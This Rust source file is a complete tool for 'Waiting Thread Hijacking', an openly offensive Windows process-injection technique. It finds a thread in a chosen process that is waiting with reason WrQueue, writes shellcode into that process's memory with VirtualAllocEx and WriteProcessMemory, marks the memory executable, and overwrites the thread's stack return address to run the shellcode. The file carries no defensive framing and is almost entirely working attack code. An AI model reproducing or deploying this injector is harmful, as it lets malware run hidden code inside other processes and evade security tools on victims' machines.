use std::{collections::HashMap, ptr::null_mut};

use ntapi::{
    ntexapi::{NtQuerySystemInformation, SYSTEM_PROCESS_INFORMATION, SYSTEM_THREAD_INFORMATION},
    ntzwapi::{ZwReadVirtualMemory, ZwWriteVirtualMemory},
};
use winapi::{
    ctypes::c_void,
    shared::{
        minwindef::{DWORD, FALSE, ULONG},
        ntdef::{NT_SUCCESS, PVOID},
    },
    um::{
        handleapi::CloseHandle,
        memoryapi::{VirtualAllocEx, VirtualProtectEx, WriteProcessMemory},
        processthreadsapi::{GetThreadContext, OpenProcess, OpenThread},
        winnt::{
            MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, PROCESS_VM_OPERATION,
            PROCESS_VM_READ, PROCESS_VM_WRITE, THREAD_GET_CONTEXT,
        },
    },
};
use winapi::{
    shared::minwindef::HMODULE,
    um::{
        libloaderapi::GetModuleHandleExA,
        winnt::{CONTEXT, HANDLE},
    },
};

mod shellcode;
use shellcode::SHELLCODE;

const WR_QUEUE: u32 = 15;

#[allow(dead_code)]
struct ThreadInfo {
    tid: u32,
    start_addr: u64,
    is_extended: bool,
    ext: ThreadInfoExt,
}

struct ThreadInfoExt {
    sys_start_addr: u64,
    state: u32,
    wait_reason: u32,
    wait_time: u32,
}

impl ThreadInfo {
    fn new(tid: u32) -> Self {
        ThreadInfo {
            tid,
            start_addr: 0,
            is_extended: false,
            ext: ThreadInfoExt {
                sys_start_addr: 0,
                state: 0,
                wait_reason: 0,
                wait_time: 0,
            },
        }
    }
}

fn wait_reason_to_string(reason: u32) -> &'static str {
    match reason {
        0 => "Executive",
        1 => "FreePage",
        2 => "PageIn",
        3 => "PoolAllocation",
        4 => "DelayExecution",
        5 => "Suspended",
        6 => "UserRequest",
        7 => "WrExecutive",
        8 => "WrFreePage",
        9 => "WrPageIn",
        10 => "WrPoolAllocation",
        11 => "WrDelayExecution",
        12 => "WrSuspended",
        13 => "WrUserRequest",
        14 => "WrEventPair",
        15 => "WrQueue",
        16 => "WrLpcReceive",
        17 => "WrLpcReply",
        18 => "WrVirtualMemory",
        19 => "WrPageOut",
        20 => "WrRendezvous",
        21 => "WrKeyedEvent",
        22 => "WrTerminated",
        23 => "WrProcessInSwap",
        24 => "WrCpuRateControl",
        25 => "WrCalloutStack",
        26 => "WrKernel",
        27 => "WrResource",
        28 => "WrPushLock",
        29 => "WrMutex",
        30 => "WrQuantumEnd",
        31 => "WrDispatchInt",
        32 => "WrPreempted",
        33 => "WrYieldExecution",
        34 => "WrFastMutex",
        35 => "WrGuardedMutex",
        36 => "WrRundown",
        37 => "WrAlertByThreadId",
        38 => "WrDeferredPreempt",
        39 => "WrPhysicalFault",
        _ => "Unknown",
    }
}

fn fetch_threads_info(pid: DWORD, threads_info: &mut HashMap<DWORD, ThreadInfo>) -> bool {
    unsafe {
        let mut buffer_size: ULONG = 0;
        let mut buffer: Vec<u8> = Vec::new();
        let mut status = NtQuerySystemInformation(5, null_mut(), 0, &mut buffer_size);

        while status == 0xC0000004u32 as i32 {
            buffer.resize(buffer_size as usize, 0);
            status = NtQuerySystemInformation(
                5,
                buffer.as_mut_ptr() as PVOID,
                buffer_size,
                &mut buffer_size,
            );
        }

        if !NT_SUCCESS(status) {
            eprintln!("[-] NtQuerySystemInformation failed: {:x}", status);
            return false;
        }

        let mut info = buffer.as_ptr() as *const SYSTEM_PROCESS_INFORMATION;
        let mut found = false;

        while !info.is_null() {
            if (*info).UniqueProcessId as u32 == pid {
                found = true;
                break;
            }
            if (*info).NextEntryOffset == 0 {
                break;
            }
            info = (info as usize + (*info).NextEntryOffset as usize)
                as *const SYSTEM_PROCESS_INFORMATION;
        }

        if !found {
            eprintln!("[-] Process ID {} not found", pid);
            return false;
        }

        let thread_count = (*info).NumberOfThreads;
        println!("[*] Found {} threads for PID {}", thread_count, pid);
        if thread_count == 0 {
            eprintln!("[-] No threads found for PID {}", pid);
            return false;
        }

        let threads_offset = std::mem::size_of::<SYSTEM_PROCESS_INFORMATION>()
            - std::mem::size_of::<SYSTEM_THREAD_INFORMATION>();
        let threads_ptr = (info as usize + threads_offset) as *const SYSTEM_THREAD_INFORMATION;

        for i in 0..thread_count {
            let thread = threads_ptr.offset(i as isize);
            if thread.is_null() {
                eprintln!("[-] Invalid thread pointer at index {}", i);
                return false;
            }

            let tid = (*thread).ClientId.UniqueThread as DWORD;
            
            threads_info
                .entry(tid)
                .or_insert_with(|| ThreadInfo::new(tid));
            
            let thread_info = threads_info.get_mut(&tid).unwrap();
            thread_info.is_extended = true;
            thread_info.ext.sys_start_addr = (*thread).StartAddress as u64;
            thread_info.ext.state = (*thread).ThreadState;
            thread_info.ext.wait_reason = (*thread).WaitReason;
            thread_info.ext.wait_time = (*thread).WaitTime;
        }
        true
    }
}

fn read_context(tid: DWORD, ctx: &mut CONTEXT) -> bool {
    unsafe {
        let h_thread = OpenThread(THREAD_GET_CONTEXT, FALSE, tid);
        if h_thread.is_null() {
            eprintln!("[-] Failed to open thread {} for context", tid);
            return false;
        }

        ctx.ContextFlags = winapi::um::winnt::CONTEXT_INTEGER | winapi::um::winnt::CONTEXT_CONTROL;
        let result = GetThreadContext(h_thread, ctx);
        CloseHandle(h_thread);
        if result == 0 {
            eprintln!("[-] GetThreadContext failed for TID {}", tid);
            return false;
        }
        true
    }
}

fn read_return_ptr<T>(h_process: HANDLE, rsp: u64) -> Option<T> {
    unsafe {
        let mut ret_addr: T = std::mem::zeroed();
        let mut read_size: usize = 0;
        let result = ZwReadVirtualMemory(
            h_process,
            rsp as PVOID,
            &mut ret_addr as *mut _ as PVOID,
            std::mem::size_of::<T>(),
            &mut read_size,
        );
        if NT_SUCCESS(result) && read_size == std::mem::size_of::<T>() {
            Some(ret_addr)
        } else {
            eprintln!("[-] Failed to read return pointer at {:x}", rsp);
            None
        }
    }
}

fn check_ret_target(ret: u64) -> bool {
    unsafe {
        let mut mod_handle: HMODULE = null_mut();
        let result = GetModuleHandleExA(
            0x4 | 0x2, // GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT
            ret as *const i8,
            &mut mod_handle,
        );

        if result == 0 {
            println!("[*] Return pointer {:x} not in any recognized module", ret);
            return false;
        }

        let ntdll =
            GetModuleHandleExA(0, "ntdll.dll\0".as_ptr() as *const i8, &mut mod_handle) != 0;
        let kernelbase =
            GetModuleHandleExA(0, "kernelbase.dll\0".as_ptr() as *const i8, &mut mod_handle) != 0;
        let kernel32 =
            GetModuleHandleExA(0, "kernel32.dll\0".as_ptr() as *const i8, &mut mod_handle) != 0;

        if ntdll || kernelbase || kernel32 {
            println!(
                "[*] Return pointer {:x} valid (ntdll/kernelbase/kernel32)",
                ret
            );
            true
        } else {
            println!(
                "[*] Return pointer {:x} not in ntdll/kernelbase/kernel32",
                ret
            );
            false
        }
    }
}

fn protect_memory(pid: DWORD, mem_ptr: PVOID, mem_size: usize, protect: DWORD) -> bool {
    unsafe {
        let h_process = OpenProcess(PROCESS_VM_OPERATION, FALSE, pid);
        if h_process.is_null() {
            eprintln!("[-] Failed to open process {} for memory protection", pid);
            return false;
        }

        let mut old_protect: DWORD = 0;
        let result = VirtualProtectEx(h_process, mem_ptr, mem_size, protect, &mut old_protect);
        CloseHandle(h_process);
        if result == 0 {
            eprintln!("[-] VirtualProtectEx failed for PID {}", pid);
            return false;
        }
        println!(
            "[+] Memory protection set to {:x} for {:x}",
            protect, mem_ptr as u64
        );
        true
    }
}

fn alloc_memory_in_process(pid: DWORD) -> Option<PVOID> {
    unsafe {
        let h_process = OpenProcess(PROCESS_VM_OPERATION, FALSE, pid);
        if h_process.is_null() {
            eprintln!("[-] Failed to open process {} for allocation", pid);
            return None;
        }

        let shellcode_ptr = VirtualAllocEx(
            h_process,
            null_mut(),
            SHELLCODE.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        CloseHandle(h_process);
        if shellcode_ptr.is_null() {
            eprintln!("[-] VirtualAllocEx failed for PID {}", pid);
            None
        } else {
            println!(
                "[+] Allocated memory at {:x} for PID {}",
                shellcode_ptr as u64, pid
            );
            Some(shellcode_ptr)
        }
    }
}

fn write_shc_into_process(pid: DWORD, shellcode_ptr: PVOID) -> bool {
    unsafe {
        let h_process = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, pid);
        if h_process.is_null() {
            eprintln!("[-] Failed to open process {} for writing", pid);
            return false;
        }

        let mut written: usize = 0;
        let result = WriteProcessMemory(
            h_process,
            shellcode_ptr,
            SHELLCODE.as_ptr() as *const c_void,
            SHELLCODE.len(),
            &mut written,
        );
        CloseHandle(h_process);
        if result == 0 || written != SHELLCODE.len() {
            eprintln!("[-] WriteProcessMemory failed for PID {}", pid);
            return false;
        }
        println!(
            "[+] Wrote {} bytes of shellcode to {:x}",
            written, shellcode_ptr as u64
        );
        true
    }
}

fn run_injected(pid: DWORD, shellcode_ptr: u64, wait_reason: DWORD) -> bool {
    let mut threads_info: HashMap<DWORD, ThreadInfo> = HashMap::new();
    if !fetch_threads_info(pid, &mut threads_info) {
        return false;
    }

    unsafe {
        let h_process = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, pid);
        if h_process.is_null() {
            eprintln!("[-] Failed to open process {} for injection", pid);
            return false;
        }

        let mut ctx: CONTEXT = std::mem::zeroed();
        let mut suitable_ret_ptr: u64 = 0;
        let mut suitable_ret: u64 = 0;

        println!("[*] Enumerating {} threads", threads_info.len());
        for (tid, info) in threads_info.iter() {
            if !info.is_extended {
                eprintln!("[-] Thread {} lacks extended info", tid);
                CloseHandle(h_process);
                return false;
            }

            if info.ext.state == 5 {
                println!(
                    "[*] TID {}: Waiting, reason: {} ({})",
                    info.tid,
                    info.ext.wait_reason,
                    wait_reason_to_string(info.ext.wait_reason)
                );
                if wait_reason != u32::MAX && info.ext.wait_reason != wait_reason {
                    continue;
                }
                if !read_context(info.tid, &mut ctx) {
                    println!("[*] Skipping TID {}: Failed to read context", info.tid);
                    continue;
                }
                if let Some(ret) = read_return_ptr::<u64>(h_process, ctx.Rsp) {
                    println!("[*] TID {}: Return address: {:x}", info.tid, ret);
                    if suitable_ret_ptr == 0 {
                        if !check_ret_target(ret) {
                            println!("[*] TID {}: Invalid return target, skipping", info.tid);
                            continue;
                        }
                        suitable_ret_ptr = ctx.Rsp;
                        suitable_ret = ret;
                        println!("[+] TID {}: Selected as injection target", info.tid);
                        break;
                    }
                }
            } else {
                println!(
                    "[*] TID {}: Not waiting, state: {}",
                    info.tid, info.ext.state
                );
            }
        }

        let mut is_injected = false;
        if suitable_ret_ptr != 0 {
            let mut written: usize = 0;
            let result = ZwWriteVirtualMemory(
                h_process,
                shellcode_ptr as PVOID,
                &suitable_ret as *const _ as PVOID,
                std::mem::size_of::<u64>(),
                &mut written,
            );
            if !NT_SUCCESS(result) || written != std::mem::size_of::<u64>() {
                eprintln!(
                    "[-] Failed to write return address to shellcode: {:x}",
                    result
                );
                CloseHandle(h_process);
                return false;
            }
            println!("[+] Wrote return address {:x} to shellcode", suitable_ret);

            if !protect_memory(
                pid,
                shellcode_ptr as PVOID,
                SHELLCODE.len(),
                PAGE_EXECUTE_READ,
            ) {
                CloseHandle(h_process);
                return false;
            }

            let new_shellcode_ptr = shellcode_ptr + 0x8;

            println!(
                "[*] Overwriting stack return: {:x} -> {:x} with {:x}",
                suitable_ret_ptr, suitable_ret, new_shellcode_ptr
            );
            let result = ZwWriteVirtualMemory(
                h_process,
                suitable_ret_ptr as PVOID,
                &new_shellcode_ptr as *const _ as PVOID,
                std::mem::size_of::<u64>(),
                &mut written,
            );
            if !NT_SUCCESS(result) || written != std::mem::size_of::<u64>() {
                eprintln!("[-] Failed to overwrite stack return pointer: {:x}", result);
                CloseHandle(h_process);
                return false;
            }
            println!(
                "[+] Stack return pointer overwritten with {:x}",
                new_shellcode_ptr
            );
            is_injected = true;
        } else {
            println!("[-] No suitable thread found for injection (wait reason: WrQueue)");
        }

        CloseHandle(h_process);
        is_injected
    }
}

fn execute_injection(process_id: DWORD) -> bool {
    println!("[*] Starting injection into PID {}", process_id);
    let shellcode_ptr = match alloc_memory_in_process(process_id) {
        Some(ptr) => ptr,
        None => return false,
    };

    if !write_shc_into_process(process_id, shellcode_ptr) {
        return false;
    }

    run_injected(process_id, shellcode_ptr as u64, WR_QUEUE)
}

fn main() {
    println!("[*] Waiting Thread Hijacking (Target Wait Reason: WrQueue)");
    let args: Vec<String> = std::env::args().collect();
    if args.len() < 2 {
        println!("[*] Usage: <program> <PID>");
        return;
    }

    let process_id: DWORD = args[1].parse().unwrap_or(0);
    if process_id == 0 {
        eprintln!("[-] Invalid process ID supplied");
        return;
    }

    unsafe {
        let h_process = OpenProcess(PROCESS_VM_OPERATION, FALSE, process_id);
        if h_process.is_null() {
            eprintln!("[-] Failed to open process {}", process_id);
            return;
        }
        CloseHandle(h_process);
        println!("[+] Process {} opened successfully", process_id);
    }

    if execute_injection(process_id) {
        println!("[+] Injection completed successfully");
    } else {
        println!("[+] Injection failed");
    }
}